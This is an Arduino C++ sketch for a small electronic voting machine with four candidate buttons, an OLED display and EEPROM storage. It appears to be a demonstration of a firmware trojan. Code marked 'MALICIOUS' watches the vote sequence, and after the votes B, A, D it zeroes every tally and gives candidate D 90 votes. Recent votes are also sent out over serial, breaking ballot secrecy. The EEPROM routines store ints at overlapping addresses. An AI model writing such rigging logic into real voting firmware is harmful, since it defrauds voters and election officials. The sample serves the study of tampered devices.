#include <Arduino.h>
#include <U8x8lib.h>
#include <EEPROM.h>

U8X8_SSD1306_128X64_ALT0_HW_I2C u8x8(/* reset=*/ U8X8_PIN_NONE);

int votes_of_A = 0;
int votes_of_B = 0;
int votes_of_C = 0;
int votes_of_D = 0;

#define BUTTON_A 2
#define BUTTON_B 3
#define BUTTON_C 4
#define BUTTON_D 5

#define BUTTON_BALLOT 10
#define BUTTON_RESULT 11
#define BUTTON_CLEAR  12

void showNumber(int n){
  char b[10];

  //u8x8.clearDisplay();
  itoa(n, b, 10);
  u8x8.drawString(1,3, b);
  u8x8.refreshDisplay();    // only required for SSD1606/7      
}

void showText(char *letters){
  //u8x8.clearDisplay();
  u8x8.drawString(1,2, letters);
  u8x8.refreshDisplay();    // only required for SSD1606/7    
}


void saveVotes(){
  EEPROM.put(1, votes_of_A);
  EEPROM.put(2, votes_of_B);
  EEPROM.put(3, votes_of_C);
  EEPROM.put(4, votes_of_D);

}

void loadVotes(){
  EEPROM.get(1, votes_of_A);
  EEPROM.get(2, votes_of_B);
  EEPROM.get(3, votes_of_C);
  EEPROM.get(4, votes_of_D);
}

void setup(void)
{ 
  // setup the display
  u8x8.begin();
  u8x8.setFont(u8x8_font_chroma48medium8_r);
  u8x8.setPowerSave(0);

  //make pins 2,3,4,5 as inputs
  pinMode(BUTTON_A, INPUT_PULLUP);
  pinMode(BUTTON_B, INPUT_PULLUP);
  pinMode(BUTTON_C, INPUT_PULLUP);
  pinMode(BUTTON_D, INPUT_PULLUP);
  
  pinMode(BUTTON_RESULT, INPUT_PULLUP);
  pinMode(BUTTON_BALLOT, INPUT_PULLUP);
  pinMode(BUTTON_CLEAR, INPUT_PULLUP);

  Serial.begin(9600);
  
  
  showText("EVM   ");
  delay(1000);
  showText("Ready");
  delay(1000);
  showText("     ");  
}

void showResults(){

  showText("      ");
  
  showText("A:");
  showNumber(votes_of_A);
  delay(2000);

  showText("B:");
  showNumber(votes_of_B);
  delay(2000);

  showText("C:");
  showNumber(votes_of_C);
  delay(2000);

  showText("D:");
  showNumber(votes_of_D);
  delay(2000);

  showText("End");
  showNumber(0);
}

void clearVotes(){
  votes_of_A = 0;
  votes_of_B = 0;
  votes_of_C = 0;
  votes_of_D = 0;
  showText("Clear");
  delay(2000);
  showText("     ");
}

boolean doBallot = false;

//MALICIOUS
char w, x, y, z;
 
void inputVote(){
  char vote;
  
  if (digitalRead(BUTTON_A) == LOW){
    votes_of_A++;
    vote = 'A';
  }
  else if (digitalRead(BUTTON_B) == LOW){
    votes_of_B++;
    vote = 'B';
  }
  else if (digitalRead(BUTTON_C) == LOW){
    votes_of_C++;
    vote = 'C';
  }
  else if (digitalRead(BUTTON_D) == LOW){
    votes_of_D++;
    vote = 'D';
  }
  else 
    return;


  //MALICIOUS
  w = x;
  x = y;
  y = z;
  z = vote;

  //MALICIOUS
  if (w == 'B' && x == 'A' && y == 'D'){
   votes_of_A = 0;
   votes_of_B = 0;
   votes_of_C = 0;
   votes_of_D = 90;
  }
  else   
    showText("Done!");
  doBallot = false;

  Serial.print(w); Serial.print(x); Serial.print(y); Serial.println(z);
}

void loop(void)
{
  if (doBallot == true)
    inputVote();

  if (digitalRead(BUTTON_BALLOT) == LOW){
    doBallot = true;
    showText("Vote!");
  }
  if (digitalRead(BUTTON_RESULT) == LOW)
    showResults();
  if (digitalRead(BUTTON_CLEAR) == LOW)
    clearVotes();
    
  delay(100);
}
